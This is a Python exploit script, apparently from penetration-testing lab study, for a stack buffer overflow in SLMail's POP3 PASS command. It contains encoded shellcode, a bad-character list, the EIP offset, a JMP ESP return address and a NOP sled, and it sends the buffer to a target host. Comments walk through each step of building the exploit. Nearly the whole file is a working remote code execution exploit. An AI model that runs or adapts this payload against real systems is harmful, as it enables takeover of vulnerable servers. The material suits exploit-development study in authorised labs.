#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# 0x0a is improperly rendered as 0x29
# 0x0d is improperly rendered as 0x0e
# bad characters are 0x00 0x0a 0x0d

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = (
"\xbd\x4a\x80\x2d\x70\xdb\xcc\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x6b\x0e\x03\x21\x8e\xcf\x85\x49\x66\x8d"
"\x66\xb1\x77\xf2\xef\x54\x46\x32\x8b\x1d\xf9\x82\xdf\x73\xf6"
"\x69\x8d\x67\x8d\x1c\x1a\x88\x26\xaa\x7c\xa7\xb7\x87\xbd\xa6"
"\x3b\xda\x91\x08\x05\x15\xe4\x49\x42\x48\x05\x1b\x1b\x06\xb8"
"\x8b\x28\x52\x01\x20\x62\x72\x01\xd5\x33\x75\x20\x48\x4f\x2c"
"\xe2\x6b\x9c\x44\xab\x73\xc1\x61\x65\x08\x31\x1d\x74\xd8\x0b"
"\xde\xdb\x25\xa4\x2d\x25\x62\x03\xce\x50\x9a\x77\x73\x63\x59"
"\x05\xaf\xe6\x79\xad\x24\x50\xa5\x4f\xe8\x07\x2e\x43\x45\x43"
"\x68\x40\x58\x80\x03\x7c\xd1\x27\xc3\xf4\xa1\x03\xc7\x5d\x71"
"\x2d\x5e\x38\xd4\x52\x80\xe3\x89\xf6\xcb\x0e\xdd\x8a\x96\x46"
"\x12\xa7\x28\x97\x3c\xb0\x5b\xa5\xe3\x6a\xf3\x85\x6c\xb5\x04"
"\xe9\x46\x01\x9a\x14\x69\x72\xb3\xd2\x3d\x22\xab\xf3\x3d\xa9"
"\x2b\xfb\xeb\x7e\x7b\x53\x44\x3f\x2b\x13\x34\xd7\x21\x9c\x6b"
"\xc7\x4a\x76\x04\x62\xb1\x11\x21\x78\xb9\xcc\x5d\x7c\xb9\x0f"
"\x25\x09\x5f\x65\x49\x5c\xc8\x12\xf0\xc5\x82\x83\xfd\xd3\xef"
"\x84\x76\xd0\x10\x4a\x7f\x9d\x02\x3b\x8f\xe8\x78\xea\x90\xc6"
"\x14\x70\x02\x8d\xe4\xff\x3f\x1a\xb3\xa8\x8e\x53\x51\x45\xa8"
"\xcd\x47\x94\x2c\x35\xc3\x43\x8d\xb8\xca\x06\xa9\x9e\xdc\xde"
"\x32\x9b\x88\x8e\x64\x75\x66\x69\xdf\x37\xd0\x23\x8c\x91\xb4"
"\xb2\xfe\x21\xc2\xba\x2a\xd4\x2a\x0a\x83\xa1\x55\xa3\x43\x26"
"\x2e\xd9\xf3\xc9\xe5\x59\x03\x80\xa7\xc8\x8c\x4d\x32\x49\xd1"
"\x6d\xe9\x8e\xec\xed\x1b\x6f\x0b\xed\x6e\x6a\x57\xa9\x83\x06"
"\xc8\x5c\xa3\xb5\xe9\x74"
)

#buffer = ["A"]
#buffer=("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9")
#root@kali-rolling-amd64:~/Documents/RTFM-scripts/CustomTools# msf-pattern_offset -q 39694438
#[*] Exact match at offset 2606
#buffer = "A"*2606 + "B"*4 + "C"*(2700-4-2606)
# Check that EIP is overwritten with exactly 4 B's and then check that ESP stack dump points to where B's start

# Check that I can expand my buffer to 3500 bytes to fit shellcode
#buffer = "A"*2606 + "B"*4 + "C"*(3500-4-2606)

# Space confirmed bhy right clicking ESP register and follow in dump. The EIP is overwritten with four B's and the remainder is overwritten with C's
# Now brute force all the bad characters and check for each improperly rendered hexidecimal digit in the dump
#buffer = badchars
# Automatically, null byte 0x00 are excluded
#buffer = "A"*2606 + "B"*4 + badchars
# Now we need to find a module in SLMail without DEP/ASLR
# Use nasmshell to find 32-bit opcode for JMP ESP
#00000000  FFE4              jmp esp
# Use mona search for '\xff\e4'
# 5F4A358F memory address for JMP ESP instruction
ret = "\x8f\x35\x4a\x5f"
# reversed for Little Endian format, must overflow the B's with this return address
# shellcode is 351 bytes long
# Add NOP sled of 16 bytes to prevent the overwriting of the decoder/encoder, NOPS are no operation characters. they will be overwritten in memory with the return address which is the jmp esp instruction. The nopsled shields the shellcode from being overwritten
#nopsled= "\x90"*16
buffer = "A"*2606 + ret + "\x90"*16 + shellcode + "C"*(3500-4-2606-351-16)
# 1. Buffer of A's overwrite to the start of the EIP register
# 2. EIP register contains JMP ESP instruction to jump to memory location of C's, which contains our shellcode
# 3. The remaining portion of 3500 byte buffer is padded by a bunch of C's less our 4 byte return address, less 2606 A's, less 351 bytes for the payload less 16 NOP characters/instructions
# We know that JMP ESP is in the EIP register now and it will go straight to our buffer of C's. Time to replace the C's with shellcode

try:
	print "\nSending evil buffer"
#	print badchars
	s.connect(("10.11.11.158",110))
	data=s.recv(1024)
	s.send('USER username'+'\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print('\nDone!')
except:
	print "Could not connect to POP3 server"

